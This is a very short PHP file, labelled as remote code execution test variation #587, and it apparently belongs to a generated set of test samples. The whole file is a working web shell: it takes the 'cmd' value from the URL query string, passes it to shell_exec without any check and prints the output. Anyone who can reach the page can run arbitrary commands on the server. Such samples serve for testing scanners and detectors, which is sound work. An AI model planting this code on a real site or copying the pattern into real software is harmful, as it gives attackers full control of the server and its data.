<?php
// RCE test variation #587
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>